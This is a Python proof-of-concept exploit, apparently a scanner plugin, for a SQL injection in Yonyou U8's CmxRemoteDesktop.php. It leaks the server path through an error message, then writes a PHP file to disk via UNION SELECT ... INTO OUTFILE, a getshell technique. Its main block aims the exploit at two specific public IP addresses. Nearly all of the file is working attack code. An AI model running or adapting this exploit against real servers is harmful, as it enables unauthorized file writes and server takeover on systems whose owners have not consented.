#/usr/bin/python
#-*- coding: utf-8 -*-
"""
POC Name  :  用友优谱u8系统.getshell CmxRemoteDesktop.php无限制getshell
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0125807
"""
import re
import os

def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg    

def audit(arg):
    payload="Server/CmxRemoteDesktop.php?pgid=App_Show&ID=1'"
    target = arg + payload
    code1, head1, res1, errcode1, _url1 = curl.curl2(target)
    try:
        m = re.findall('<b>(.*?)</b>',res1)
        shell_path = str(os.path.dirname(m[1])) + '\\md5.php'
        shell_path = re.sub(r'\\',r'\\\\',shell_path)
        payload="Server/CmxRemoteDesktop.php?pgid=App_Show&ID=1%20union%20select%201,2,3,'\<\?php%20echo%20md5(123);\?\>',5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3%20into%20outfile%20'{shell_path}'".format(shell_path=shell_path)
        exp_url=arg+payload
        code, head, res, errcode, _url = curl.curl2(exp_url)
        verify_url = arg + 'Server/md5.php'
        code, head, res, errcode, _url = curl.curl2(verify_url)
        if code == 200 and '202cb962ac59075b964b07152d234b70' in res: 
            security_hole(verify_url)
    except:pass
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8','http://58.217.117.20:81/')[1])
    audit(assign('yongyou_u8','http://221.238.243.237:8000/')[1])